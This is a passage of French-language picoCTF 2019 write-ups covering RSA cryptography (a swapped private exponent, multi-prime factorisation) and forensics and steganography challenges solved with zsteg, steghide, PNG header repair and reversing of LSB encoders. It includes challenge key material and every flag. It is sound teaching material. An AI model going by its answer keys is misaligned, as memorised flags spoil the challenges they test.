MIIB4AIBAAKBgGm8pJwv6Dkf7SDwkfTpD7n6as3eNGQGbXIdhm76Ts7F4wOo/WZf
/cp22ZNXlMvZvsnrDgztJU4Cnn4u8bDRzkfRse3LcXtY6SUY3Yhp7L9XhHwuB5ZQ
yZtY4O/G5s8DHxKa8Jt3c9Ruf+IG5bzkRMvl2YuBXSfXE8ut2tfXElN7AoGAShs4
k27QJxlFLMzuvuOJbiMgL+EIfwIyOsSOr8Em8qymiq4py1KDoR7jJu0/EBAwM3xW
gKDEgIQ9aNql8fNZyvqSlaEx49SjvvrRKY1qgj3Ob27SxxAXu3GFVZggVbA9lCM0
bCazD+x51wdJDEPp7SP1uCz58T3on+VY0nsh0aECAwEAAQJBAIxJmuR0uBuzTKph
Lm+R+eJbQgfVPZC/UFWTqXrko2lO8QbH56iald68hCZ3oQyay/Nwt8tSqBYekmmA
M5qtTN8CQQDA84DIwnVlssKGVt+ddLNxRzSXTZ+yBivW0kMff87mX8SnWdG7MJlp
V0+xCHOQMzwVy8+SW+0PqsCUXNPJ9XDlAgMBAAECAwEAAQJAWnT5O//JX6FVwclf
xC+6BUCZyX3crGjgH4NOxyjCuIv52N39Sf5MyyLBQv1DlSTF6tdLsCflgjj3459o
ucrE4w==
-----END RSA PRIVATE KEY-----

$ vi priv_key.pem
-----BEGIN RSA PRIVATE KEY-----
MIIB4AIBAAKBgGm8pJwv6Dkf7SDwkfTpD7n6as3eNGQGbXIdhm76Ts7F4wOo/WZf
/cp22ZNXlMvZvsnrDgztJU4Cnn4u8bDRzkfRse3LcXtY6SUY3Yhp7L9XhHwuB5ZQ
yZtY4O/G5s8DHxKa8Jt3c9Ruf+IG5bzkRMvl2YuBXSfXE8ut2tfXElN7AoGAShs4
k27QJxlFLMzuvuOJbiMgL+EIfwIyOsSOr8Em8qymiq4py1KDoR7jJu0/EBAwM3xW
gKDEgIQ9aNql8fNZyvqSlaEx49SjvvrRKY1qgj3Ob27SxxAXu3GFVZggVbA9lCM0
bCazD+x51wdJDEPp7SP1uCz58T3on+VY0nsh0aECAwEAAQJBAIxJmuR0uBuzTKph
Lm+R+eJbQgfVPZC/UFWTqXrko2lO8QbH56iald68hCZ3oQyay/Nwt8tSqBYekmmA
M5qtTN8CQQDA84DIwnVlssKGVt+ddLNxRzSXTZ+yBivW0kMff87mX8SnWdG7MJlp
V0+xCHOQMzwVy8+SW+0PqsCUXNPJ9XDlAgMBAAECAwEAAQJAWnT5O//JX6FVwclf
xC+6BUCZyX3crGjgH4NOxyjCuIv52N39Sf5MyyLBQv1DlSTF6tdLsCflgjj3459o
ucrE4w==
-----END RSA PRIVATE KEY-----

# On récupère l'exposant privée de la clef privée
$ openssl rsa -in priv_key.pem -text -noout
RSA Private-Key: (1023 bit, 2 primes)
modulus:
    69:bc:a4:9c:2f:e8:39:1f:ed:20:f0:91:f4:e9:0f:
    b9:fa:6a:cd:de:34:64:06:6d:72:1d:86:6e:fa:4e:
    ce:c5:e3:03:a8:fd:66:5f:fd:ca:76:d9:93:57:94:
    cb:d9:be:c9:eb:0e:0c:ed:25:4e:02:9e:7e:2e:f1:
    b0:d1:ce:47:d1:b1:ed:cb:71:7b:58:e9:25:18:dd:
    88:69:ec:bf:57:84:7c:2e:07:96:50:c9:9b:58:e0:
    ef:c6:e6:cf:03:1f:12:9a:f0:9b:77:73:d4:6e:7f:
    e2:06:e5:bc:e4:44:cb:e5:d9:8b:81:5d:27:d7:13:
    cb:ad:da:d7:d7:12:53:7b
publicExponent:
    4a:1b:38:93:6e:d0:27:19:45:2c:cc:ee:be:e3:89:
    6e:23:20:2f:e1:08:7f:02:32:3a:c4:8e:af:c1:26:
    f2:ac:a6:8a:ae:29:cb:52:83:a1:1e:e3:26:ed:3f:
    10:10:30:33:7c:56:80:a0:c4:80:84:3d:68:da:a5:
    f1:f3:59:ca:fa:92:95:a1:31:e3:d4:a3:be:fa:d1:
    29:8d:6a:82:3d:ce:6f:6e:d2:c7:10:17:bb:71:85:
    55:98:20:55:b0:3d:94:23:34:6c:26:b3:0f:ec:79:
    d7:07:49:0c:43:e9:ed:23:f5:b8:2c:f9:f1:3d:e8:
    9f:e5:58:d2:7b:21:d1:a1
privateExponent: 65537 (0x10001)
prime1:
    00:8c:49:9a:e4:74:b8:1b:b3:4c:aa:61:2e:6f:91:
    f9:e2:5b:42:07:d5:3d:90:bf:50:55:93:a9:7a:e4:
    a3:69:4e:f1:06:c7:e7:a8:9a:95:de:bc:84:26:77:
    a1:0c:9a:cb:f3:70:b7:cb:52:a8:16:1e:92:69:80:
    33:9a:ad:4c:df
prime2:
    00:c0:f3:80:c8:c2:75:65:b2:c2:86:56:df:9d:74:
    b3:71:47:34:97:4d:9f:b2:06:2b:d6:d2:43:1f:7f:
    ce:e6:5f:c4:a7:59:d1:bb:30:99:69:57:4f:b1:08:
    73:90:33:3c:15:cb:cf:92:5b:ed:0f:aa:c0:94:5c:
    d3:c9:f5:70:e5
exponent1: 65537 (0x10001)
exponent2: 65537 (0x10001)
coefficient:
    5a:74:f9:3b:ff:c9:5f:a1:55:c1:c9:5f:c4:2f:ba:
    05:40:99:c9:7d:dc:ac:68:e0:1f:83:4e:c7:28:c2:
    b8:8b:f9:d8:dd:fd:49:fe:4c:cb:22:c1:42:fd:43:
    95:24:c5:ea:d7:4b:b0:27:e5:82:38:f7:e3:9f:68:
    b9:ca:c4:e3
```

* On obtient l'exposant privé utilisé. d = 65537

```python
> c = 12799267366578245460090107813991913234250219819928939944932512748001008336364043700007306744934958582934300952098920361517640986375792081693755571700466428919116291361852953951145864971276848212661514792085419149615156655272066275262712828202027608430310538957716807879880354335872305034011133666376788443987
> d = 65537
> n = 74250966958507921051625216758984587597148135882200278282055368693416179049334546986821754703505041395601145398790071820445075797236535326599362635119309137183136787903354293017064238317105822411647252527637303583049262741151903298758443779187235787140712207411062126015664419732894263786658852152909780636539
> m = str(hex(pow(c, d, n)))[2::]
> print(''.join([chr(int(''.join(c), 16)) for c in zip(m[0::2],m[1::2])]))
picoCTF{bad_1d3a5_6786084}
```
`picoCTF{bad_1d3a5_6786084}`



# crypto_450_b00tl3gRSA3

------

### Titre : B00tl3gRSA3

### Points : 450

------

### Description

Why use p and q when I can use more ?

---

Connect with `nc 2019shell1.picoctf.com 12275`

#### Hints

* There's more prime factors than p and q, finding d is going to be different.

---

### Résolution

---

```bash
$ nc 2019shell1.picoctf.com 12275
c: 7102577393434866594929140550804968099111271800384955683330956013020579564684516163830573468073604865935034522944441894535695787080676107364035121171758895218132464499398807752144702697548021940878072503062685829101838944413876346837812265739970980202827485238414586892442822429233004808821082551675699702413952211939387589361654209039260795229
n: 14641034851154010900546719241402474912998133209474218975103977449764205791710698412984067810848509509669017831054155506105922179074286929418416328797379636196613023210067141695123691351917498467761961980966631958692894027223505926821780581042313171803091956255639968110368314924456998367348008686435826036480738828760312467761150839006456972383
e: 65537
```
D'après la description, tout nous laisse croire qu'il a été utilisé plusieurs prime pour générer le modulus et phi. 

On va donc tenter de factoriser N dans un premier temps.

* Utilisation du site alpertron 

```
Factorisation de N :
8689 808021 × 8695 017263 × 8898 186371 × 9013 542959 × 9276 035017 × 9757 731091 × 9810 071993 × 9924 517117 × 10477 149401 × 10623 217379 × 10908 502043 × 11047 994669 × 11076 571609 × 11095 032211 × 11176 250641 × 11637 407183 × 12256 725947 × 12722 568247 × 13308 911699 × 13462 432133 × 13621 704643 × 14522 614643 × 14809 979251 × 15014 703169 × 15103 718327 × 15164 402111 × 15346 793227 × 15839 079479 × 15999 246007 × 16069 169147 × 16131 871801 × 16209 334619 × 16281 055853 × 17073 486953
```

Grâce à cette factorisation, on obtient les primes recomposant phi.



* Script de déchiffrement RSA_multi_prime.py :

```python
def egcd(a, b):
	if (a == 0):
		return [b, 0, 1]
	else:
		g, y, x = egcd(b % a, a)
		return [g, x - (b // a) * y, y]

def modInv(a, m):
	g, x, y = egcd(a, m)
	return x % m

e = 65537
n = 14641034851154010900546719241402474912998133209474218975103977449764205791710698412984067810848509509669017831054155506105922179074286929418416328797379636196613023210067141695123691351917498467761961980966631958692894027223505926821780581042313171803091956255639968110368314924456998367348008686435826036480738828760312467761150839006456972383
phi = (8689808021-1)*(8695017263-1)*(8898186371-1)*(9013542959-1)*(9276035017-1)*(9757731091-1)*(9810071993-1)*(9924517117-1)*(10477149401-1)*(10623217379-1)*(10908502043-1)*(11047994669-1)*(11076571609-1)*(11095032211-1)*(11176250641-1)*(11637407183-1)*(12256725947-1)*(12722568247-1)*(13308911699-1)*(13462432133-1)*(13621704643-1)*(14522614643-1)*(14809979251-1)*(15014703169-1)*(15103718327-1)*(15164402111-1)*(15346793227-1)*(15839079479-1)*(15999246007-1)*(16069169147-1)*(16131871801-1)*(16209334619-1)*(16281055853-1)*(17073486953-1)
c = 7102577393434866594929140550804968099111271800384955683330956013020579564684516163830573468073604865935034522944441894535695787080676107364035121171758895218132464499398807752144702697548021940878072503062685829101838944413876346837812265739970980202827485238414586892442822429233004808821082551675699702413952211939387589361654209039260795229
d = modInv(e, phi)
plain = str(hex(pow(c, d, n)))[2::]
print(''.join([chr(int(''.join(c), 16)) for c in zip(plain[0::2],plain[1::2])]))
```

`picoCTF{too_many_fact0rs_4817985}`

# forensics_150_what_lies_within

------

### Titre : What Lies Within

### Points : 150

------

### Description

------

Theres something in the [building](https://2019shell1.picoctf.com/static/aec3861fc4d5bce4d39dc0db196426de/buildings.png).

------

### Résolution

---

LSB classico 

```bash
$ zsteg buildings.png 
b1,r,lsb,xy         .. text: "^5>R5YZrG"
b1,rgb,lsb,xy       .. text: "picoCTF{h1d1ng_1n_th3_b1t5}"
b1,abgr,msb,xy      .. file: PGP\011Secret Sub-key -
b2,b,lsb,xy         .. text: "XuH}p#8Iy="
b3,abgr,msb,xy      .. text: "t@Wp-_tH_v\r"
b4,r,lsb,xy         .. text: "fdD\"\"\"\" "
b4,r,msb,xy         .. text: "%Q#gpSv0c05"
b4,g,lsb,xy         .. text: "fDfffDD\"\""
b4,g,msb,xy         .. text: "f\"fff\"\"DD"
b4,b,lsb,xy         .. text: "\"$BDDDDf"
b4,b,msb,xy         .. text: "wwBDDDfUU53w"
b4,rgb,msb,xy       .. text: "dUcv%F#A`"
b4,bgr,msb,xy       .. text: " V\"c7Ga4"
b4,abgr,msb,xy      .. text: "gOC_$_@o"
```

`picoCTF{h1d1ng_1n_th3_b1t5}`



# forensic_250_c0rrupt

------

### Titre : c0rrupt

### Points : 250

------

### Description

------

We found this file. Recover the flag. You can also find the file in  /problems/c0rrupt_0_1fcad1344c25a122a00721e4af86de13.

#### Hints

* Try fixing the file header

------

### Résolution

---

http://www.libpng.org/pub/png/spec/1.2/PNG-Chunks.html

https://hackmd.io/@FlsYpINbRKixPQQVbh98kw/Sk_lVRCBr

https://www.w3.org/TR/2003/REC-PNG-20031110/

```bash
$ file mystery 
mystery: data
```

Le but de ce challenge va sûrement être de corriger le header de ce fichier.

```bash
$ xxd mystery
00000000: 8965 4e34 0d0a b0aa 0000 000d 4322 4452  .eN4........C"DR
00000010: 0000 066a 0000 0447 0802 0000 007c 8bab  ...j...G.....|..
00000020: 7800 0000 0173 5247 4200 aece 1ce9 0000  x....sRGB.......
00000030: 0004 6741 4d41 0000 b18f 0bfc 6105 0000  ..gAMA......a...
00000040: 0009 7048 5973 aa00 1625 0000 1625 0149  ..pHYs...%...%.I
00000050: 5224 f0aa aaff a5ab 4445 5478 5eec bd3f  R$......DETx^..?
00000060: 8e64 cd71 bd2d 8b20 2080 9041 8302 08d0  .d.q.-.  ..A....
...
```

On peut voir que les premiers octets de `mystery` sont proches de ceux d'un PNG. On peut reconnaître que `eN4` est proche de `PNG` et que `C"DR` est proche de `IHDR`. Il faut sûrement reconstituer une image au format PNG.

```bash
$ cp mystery img.png
$ hexedit img.png
```

Nous pouvons utiliser `hexedit` pour éditer notre image. Nous savons qu'une image au format PNG est divisée en plusieurs morceaux, ces morceaux sont appelés des chunks. Ces chunks contiennent des informations sur l'image en question.

```bash
$ pngcheck -v img.png
# -v: verbose
```

On peut suivre la validé de nos modifications avec `pngcheck`, ce dernier va vérifier si les chunks sont bons en utilisant le CRC-32 se trouvant à la fin de chacun d'eux. Dès que le chunk courant à le bon CRC-32, on passe au suivant, etc...

```bash
$ pngcheck -v img.png
File: test.png (202940 bytes)
  chunk IHDR at offset 0x0000c, length 13
    1642 x 1095 image, 24-bit RGB, non-interlaced
  chunk sRGB at offset 0x00025, length 1
    rendering intent = perceptual
  chunk gAMA at offset 0x00032, length 4: 0.45455
  chunk pHYs at offset 0x00042, length 9: 5669x5669 pixels/meter (144 dpi)
  chunk IDAT at offset 0x00057, length 65445
    zlib: deflated, 32K window, fast compression
  chunk IDAT at offset 0x10008, length 65524
  chunk IDAT at offset 0x20008, length 65524
  chunk IDAT at offset 0x30008, length 6304
  chunk IEND at offset 0x318b4, length 0
No errors detected in test.png (9 chunks, 96.3% compression).
$ file test.png 
test.png: PNG image data, 1642 x 1095, 8-bit/color RGB, non-interlaced
```

Étape par étape, nous nous retrouvons avec une image corrigée qui nous donne le flag.

`picoCTF{c0rrupt10n_1847995}`

# forensics_250_like1000

------

### Titre : like1000

### Points : 250

------

### Description

------

This .tar file got tarred alot.

### Résolution

---

C'est un fichier png dans un tar, dans un tar, dans un tar....  

```bash
$ ls
1000.tar  readme.md  script.sh  tmp
$ cp 1000.tar tmp/
$ ./script.sh 1000.tar 
1000.tar: POSIX tar archive (GNU)
999.tar: POSIX tar archive (GNU)
998.tar: POSIX tar archive (GNU)
997.tar: POSIX tar archive (GNU)
...
1.tar: POSIX tar archive (GNU)
flag.png: PNG image data, 1642 x 1095, 8-bit/color RGB, non-interlaced
FIND!
$ ls tmp/
flag.png
```

`picoCTF{l0t5_0f_TAR5}`


# forensics_250_m00nwalk

------

### Titre : m00nwalk

### Points : 250

------

### Description

------

Decode this [message](https://2019shell1.picoctf.com/static/46c46c51c0a7bfc7ca25cd1b6f1c47b2/message.wav) from the moon.

------

### Résolution

---

Il s'agit d'un fichier audio, il s'agit d'une transmission sstv. (Mode : Scottie 1)  

[Tuto pour décoder](https://www.chonky.net/hamradio/decoding-sstv-from-a-file-on-a-linux-system)

`picoCTF{beep_boop_im_in_5pace}`



# forensics_300_m00nwalk2

------

### Titre : m00nwalk2

### Points : 300

------

### Description

------

Revisit the last transmission. We think this [transmission](https://2019shell1.picoctf.com/static/ebabbcf81c0a2740485b3827a6c2aae9/message.wav) contains a hidden message. There are also some clues [clue 1](https://2019shell1.picoctf.com/static/ebabbcf81c0a2740485b3827a6c2aae9/clue1.wav), [clue 2](https://2019shell1.picoctf.com/static/ebabbcf81c0a2740485b3827a6c2aae9/clue2.wav), [clue 3](https://2019shell1.picoctf.com/static/ebabbcf81c0a2740485b3827a6c2aae9/clue3.wav).

### Résolution

---

Voir m00nwalk1 pour décoder les images.  
On décode les trois indices & le message, le message est le même que le premier challenge le flag doit être ailleurs que sur l'image.  
L'indice 1 est surment une bonne biste : hidden_stegosaurus.... hide[...]steg... steghide ?  
go essayer avec le password  

```bash
$ steghide extract -sf message.wav 
Enter passphrase: hidden_stegosaurus
wrote extracted data to "steganopayload12154.txt".
$ cat steganopayload12154.txt
picoCTF{the_answer_lies_hidden_in_plain_sight}
```

Bingo on a le flag.  



`picoCTF{the_answer_lies_hidden_in_plain_sight}`


# forensics_300_shark_on_wire_2

------

### Titre : shark on wire 2

### Points : 300

------

### Description

------

We found this [packet capture](https://2019shell1.picoctf.com/static/dcd259894e0efe9d6e91da2af47e6369/capture.pcap). Recover the flag that was pilfered from the network.

------

### Résolution

---

En analysant le pcap on trouve un paquet contenant start et un autre end.  
Le flag doit donc être entre ces deux paquets. En regardant les paquets on remarque que les port change... Et que certains paquet on les lettres désiré (ECW...). Bingo!  

Pour plus de détail voir script.py ( [git.riviere-r.fr](https://git.riviere-r.fr) )  

```bash
$ python3 script.py 
picoCTF{p1LLf3r3d_data_v1a_st3g0}
```



`picoCTF{p1LLf3r3d_data_v1a_st3g0}`


# forensics_350_WebNet0

------

### Titre : WebNet0

### Points : 350

------

### Description

------

We found this [packet capture](https://2019shell1.picoctf.com/static/470e17b168561f9eabdfa95e412dbe10/capture.pcap) and [key](https://2019shell1.picoctf.com/static/470e17b168561f9eabdfa95e412dbe10/picopico.key). Recover the flag.  

------

### Résolution

---

On a un fichier pcap, avec des communications chiffrées (HTTPS) et la clé ... Bah faut juste paramétrer wireshark et on peut déchiffrer les paquets....

`picoCTF{nongshim.shrimp.crackers}`


# forensic_350_investigative_reversing_2

------

### Titre : Investigative Reversing 2

### Points : 350

------

### Description

------

We have recovered a binary and an image See what you can make of it. There should be a flag somewhere. Its also found in /problems/investigative-reversing-2_5_b294e24c9063edbf722b9554e7750d19 on the shell server.

#### Hints

* Try using some forensics skills on the image
* This problem requires both forensics and reversing skills
* What is LSB encoding?

------

### Résolution

---

```bash
$ file mystery 
mystery: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=2d2155d1fe9b3de7809f36ce63468d6e9a9ebbf7, not stripped

$ file encoded.bmp 
encoded.bmp: PC bitmap, Windows 3.x format, 1765 x 852 x 8
```

Le flag est sûrement caché dans l'image.

```c
undefined8 main(void) {
  long lVar1;
  FILE *fd_flag;
  FILE *img_input;
  FILE *img_output;
  size_t sVar2;
  ulong uVar3;
  long in_FS_OFFSET;
  byte readed_img_char;
  char new_char;
  int local_7c;
  int i;
  int j;
  int index;
  FILE *flag_fd;
  char flag [56];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  fd_flag = fopen("flag.txt","r");
  img_input = fopen("original.bmp","r");
  img_output = fopen("encoded.bmp","a");
  if (fd_flag == (FILE *)0x0) {
    puts("No flag found, please make sure this is run on the server");
  }
  if (img_input == (FILE *)0x0) {
    puts("original.bmp is missing, please run this on the server");
  }
  sVar2 = fread(&readed_img_char,1,1,img_input);
  local_7c = (int)sVar2;
  i = 0;
  while (i < 2000) {
    fputc((int)(char)readed_img_char,img_output);
    sVar2 = fread(&readed_img_char,1,1,img_input);
    local_7c = (int)sVar2;
    i = i + 1;
  }
  sVar2 = fread(flag,0x32,1,fd_flag);
  if ((int)sVar2 < 1) {
    puts("flag is not 50 chars");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  j = 0;
  while (j < 0x32) {
    index = 0;
    while (index < 8) {
      uVar3 = codedChar(index,flag[(long)j] - 5,readed_img_char);
      fputc((int)(char)uVar3,img_output);
      fread(&readed_img_char,1,1,img_input);
      index = index + 1;
    }
    j = j + 1;
  }
  while (local_7c == 1) {
    fputc((int)(char)readed_img_char,img_output);
    sVar2 = fread(&readed_img_char,1,1,img_input);
    local_7c = (int)sVar2;
  }
  fclose(img_output);
  fclose(img_input);
  fclose(fd_flag);
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

```c
ulong codedChar(int index,byte char,byte readed_char) {
  byte local_20;
  
  local_20 = char;
  if (index != 0) {
    local_20 = (byte)((int)(char)char >> ((byte)index & 0x1f));
  }
  return (ulong)(readed_char & 0xfe | local_20 & 1);
}
```

Le flag se trouve dans `flag.txt`, l'image de base est `original.bmp`, et l'image qui va contenir le flag est `encoded.bmp` (celle que nous possédons).

Les 2000 premiers octets de `original.bmp` sont copiés tels quels dans `encoded.bmp`. Puis nous cachons les `0x32` caractères du flag aux quels nous ajoutons un chiffrement par décalage de `-5`. Nous cachons le flag bit par bit en commencant par les bits de poids faibles.

Nous savons que le flag fait `0x32` (50) caractères.

```python
#!/usr/bin/env python3

f = open('encoded.bmp', 'rb').read()

# skip the first 2000 bytes
start = 2000

# find the good size
end = start + (0x32*8)

# select data
data = f[start:end]

# extract the bits
res = ''
for i in range(len(data)):
    res += bin(data[i])[-1]

# bytes blocks
res = [res[i:i+8] for i in range(0, len(res), 8)]

# inverse
res = [b[::-1] for b in res]

# to int and remove offset
res = [int(b,2)+5 for b in res]

print(''.join([chr(b) for b in res]))
```

```bash
$ python3 resolv.py 
picoCTF{n3xt_0n30000000000000000000000000f69eb8c8}
```

`picoCTF{n3xt_0n30000000000000000000000000f69eb8c8}`

# forensic_350_pasta111

------

### Titre : pastaAAA

### Points : 350

------

### Description

------

This pasta is up to no good. There MUST be something behind it.

#### Hints

* Try fixing the file header

------

### Résolution

---

```bash
$ file ctf.png 
ctf.png: PNG image data, 826 x 620, 8-bit/color RGB, non-interlaced
```

En utilsant `stegsolve`, nous pouvons voir que des données sont cachées sur les channels RGB, sur les bits 2-1-0.

La difficulté de ce challenge est de trouver les bons caractères de celui-ci, notamment, le `$`.

`picoCTF{pa$ta_1s_lyf3}`

# forensic_400_investigative_reversing_3

------

### Titre : Investigative Reversing 3

### Points : 400

------

### Description

------

We have recovered a binary and an image See what you can make of it. There should be a flag somewhere. Its also found in /problems/investigative-reversing-3_4_e9ac1257fd5c98754e88bca6c65a6d5a on the shell server.

#### Hints

* You will want to reverse how the LSB encoding works on this problem

------

### Résolution

---

```bash
$ file mystery 
mystery: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=84b6f32deb8d6ef5099ab1fac1a24f3f273cfaa0, not stripped$ file mystery 
mystery: data

$ file encoded.bmp 
encoded.bmp: PC bitmap, Windows 3.x format, 1765 x 852 x 8
```

```c
undefined8 main(void) {
  long lVar1;
  FILE *fd_flag;
  FILE *img_src;
  FILE *img_dst;
  size_t sVar2;
  ulong new_char;
  long in_FS_OFFSET;
  byte readed_char;
  int local_7c;
  int i;
  uint j;
  int index;
  FILE *flag_fd;
  byte flag [56];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  fd_flag = fopen("flag.txt","r");
  img_src = fopen("original.bmp","r");
  img_dst = fopen("encoded.bmp","a");
  if (fd_flag == (FILE *)0x0) {
    puts("No flag found, please make sure this is run on the server");
  }
  if (img_src == (FILE *)0x0) {
    puts("No output found, please run this on the server");
  }
  sVar2 = fread(&readed_char,1,1,img_src);
  local_7c = (int)sVar2;
  i = 0;
  while (i < 0x2d3) {
    fputc((int)(char)readed_char,img_dst);
    sVar2 = fread(&readed_char,1,1,img_src);
    local_7c = (int)sVar2;
    i = i + 1;
  }
  sVar2 = fread(flag,0x32,1,fd_flag);
  if ((int)sVar2 < 1) {
    puts("Invalid Flag");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  j = 0;
  while ((int)j < 100) {
    if ((j & 1) == 0) {
      index = 0;
      while (index < 8) {
        new_char = codedChar(index,flag[(long)((int)(j + (j >> 0x1f)) >> 1)],readed_char);
        fputc((int)(char)new_char,img_dst);
        fread(&readed_char,1,1,img_src);
        index = index + 1;
      }
    }
    else {
      fputc((int)(char)readed_char,img_dst);
      fread(&readed_char,1,1,img_src);
    }
    j = j + 1;
  }
  while (local_7c == 1) {
    fputc((int)(char)readed_char,img_dst);
    sVar2 = fread(&readed_char,1,1,img_src);
    local_7c = (int)sVar2;
  }
  fclose(img_dst);
  fclose(img_src);
  fclose(fd_flag);
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

Ce challenge est proche du précédent, c'est juste la manière de cacher les données qui va changer.

```c
  j = 0;
  while ((int)j < 100) {
    if ((j & 1) == 0) {
      index = 0;
      while (index < 8) {
        new_char = codedChar(index,flag[(long)((int)(j + (j >> 0x1f)) >> 1)],readed_char);
        fputc((int)(char)new_char,img_dst);
        fread(&readed_char,1,1,img_src);
        index = index + 1;
      }
    }
    else {
      fputc((int)(char)readed_char,img_dst);
      fread(&readed_char,1,1,img_src);
    }
    j = j + 1;
  }
```

```c
ulong codedChar(int index,byte char,byte readed_char) {
  byte local_20;
  
  local_20 = char;
  if (index != 0) {
    local_20 = (byte)((int)(char)char >> ((byte)index & 0x1f));
  }
  return (ulong)(readed_char & 0xfe | local_20 & 1);
}
```

Le script suivant permet d'extraire les données cachées.

```bash
#!/usr/bin/env python3

f = open('encoded.bmp', 'rb')

# skip 0x2d3 bytes
f.seek(0x2d3)

# extract bits
res = ''
char = f.read(1)
j = 0
while j < 100:
    if (j & 1) == 0:
        index = 0
        while index < 8:
            res +=  bin(ord(char))[-1]
            char = f.read(1)
            index += 1
    else:
        char = f.read(1)
    j += 1

# bytes blocks
res = [res[i:i+8] for i in range(0, len(res), 8)]

# inverse
res = [b[::-1] for b in res]

# to int
res = [int(b,2) for b in res]

print(''.join([chr(b) for b in res]))
```

```bash
$ python3 resolv.py 
picoCTF{4n0th3r_L5b_pr0bl3m_00000000000009b6871eb}
```

`picoCTF{4n0th3r_L5b_pr0bl3m_00000000000009b6871eb}`

# forensic_400_investigative_reversing_4

------

### Titre : Investigative Reversing 4

### Points : 400

------

### Description

------

We have recovered a binary and 5 images: image01, image02, image03, image04, image05. See what you can make of it. There should be a flag somewhere. Its also found in /problems/investigative-reversing-4_4_065969419be9af8229e29d22453a06d0 on the shell server.

#### Hints

* 

------

### Résolution

---

```bash
$ file mystery 
mystery: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b671dc4e37510bec651d650ed78ea135f8cdf702, not stripped

$ file Item0*
Item01_cp.bmp: PC bitmap, Windows 3.x format, 1765 x 852 x 8
Item02_cp.bmp: PC bitmap, Windows 3.x format, 1765 x 852 x 8
Item03_cp.bmp: PC bitmap, Windows 3.x format, 1765 x 852 x 8
Item04_cp.bmp: PC bitmap, Windows 3.x format, 1765 x 852 x 8
Item05_cp.bmp: PC bitmap, Windows 3.x format, 1765 x 852 x 8
```

Cette fois nous avons plusieurs images.

```c
undefined8 main(void) {
  size_t sVar1;
  undefined4 local_4c;
  undefined local_48 [52];
  int local_14;
  FILE *flag_fd;
  
  flag = local_48;
  local_4c = 0;
  flag_index = &local_4c;
  flag_fd = fopen("flag.txt","r");
  if (flag_fd == (FILE *)0x0) {
    puts("No flag found, please make sure this is run on the server");
  }
  sVar1 = fread(flag,0x32,1,flag_fd);
  local_14 = (int)sVar1;
  if (local_14 < 1) {
    puts("Invalid Flag");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fclose(flag_fd);
  encodeAll();
  return 0;
}
```

Ce challenge est proche du précédent, c'est juste la manière de cacher les données qui va changer.

```c
void encodeAll(void) {
  ulong item01;
  ulong local_28;
  undefined8 bmp;
  undefined4 local_18;
  char index;
  
  local_28 = 0x635f31306d657449;
  bmp = 0x706d622e70;
  local_18 = 0;
  item01 = 0x622e31306d657449;
  index = '5';
  while ('0' < index) {
    item01._0_6_ = CONCAT15(index,(undefined5)item01);
    item01 = item01 & 0xffff000000000000 | (ulong)(uint6)item01;
    local_28._0_6_ = CONCAT15(index,(undefined5)local_28);
    local_28 = local_28 & 0xffff000000000000 | (ulong)(uint6)local_28;
    encodeDataInFile((char *)&item01,(char *)&local_28);
    index = index + -1;
  }
  return;
}
```

Les données sont cachées successivement dans les 5 images.

```c
void encodeDataInFile(char *param_1,char *param_2) {
  FILE *src;
  FILE *dest;
  size_t sVar1;
  ulong uVar2;
  byte readed_char;
  int limit;
  FILE *dst;
  FILE *img_src;
  int index;
  int j;
  int i;
  int local_c;
  
  src = fopen(param_1,"r");
  dest = fopen(param_2,"a");
  if (src != (FILE *)0x0) {
    sVar1 = fread(&readed_char,1,1,src);
    local_c = (int)sVar1;
    i = 0;
    while (i < 0x7e3) {
      fputc((int)(char)readed_char,dest);
      sVar1 = fread(&readed_char,1,1,src);
      local_c = (int)sVar1;
      i = i + 1;
    }
    j = 0;
    while (j < 0x32) {
      if (j % 5 == 0) {
        index = 0;
        while (index < 8) {
          uVar2 = codedChar(index,*(byte *)((long)*flag_index + flag),readed_char);
          fputc((int)(char)uVar2,dest);
          fread(&readed_char,1,1,src);
          index = index + 1;
        }
        *flag_index = *flag_index + 1;
      }
      else {
        fputc((int)(char)readed_char,dest);
        fread(&readed_char,1,1,src);
      }
      j = j + 1;
    }
    while (local_c == 1) {
      fputc((int)(char)readed_char,dest);
      sVar1 = fread(&readed_char,1,1,src);
      local_c = (int)sVar1;
    }
    fclose(dest);
    fclose(src);
    return;
  }
  puts("No output found, please run this on the server");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

Ajout des données dans l'image.

```c
ulong codedChar(int index,byte char,byte readed_char) {
  byte local_20;
  
  local_20 = char;
  if (index != 0) {
    local_20 = (byte)((int)(char)char >> ((byte)index & 0x1f));
  }
  return (ulong)(readed_char & 0xfe | local_20 & 1);
}
```

Extraction des données de chaque image.

```bash
#!/usr/bin/env python3

res = ''
for c in '54321':
    f = open(f'Item0{c}_cp.bmp', 'rb')
    f.seek(0x7e3)

    char = f.read(1)
    j = 0
    while j < 0x32:
        if (j % 5) == 0:
            index = 0
            while index < 8:
                res += bin(ord(char))[-1]
                char = f.read(1)
                index += 1
        else:
            char = f.read(1)
        j += 1

# bytes blocks
res = [res[i:i+8] for i in range(0, len(res), 8)]

# inverse
res = [b[::-1] for b in res]

# to int
res = [int(b,2) for b in res]

print(''.join([chr(b) for b in res]))

# 5 to 1
# src -> Item05_cp.bmp
# dest -> Item05.bmp
```

```bash
$ python3 resolv.py 
picoCTF{N1c3_R3ver51ng_5k1115_000000000008d246eaf}
```

`picoCTF{N1c3_R3ver51ng_5k1115_000000000008d246eaf}`

# forensics_450_WebNet1

------

### Titre : WebNet1

### Points : 450

------

### Description

------

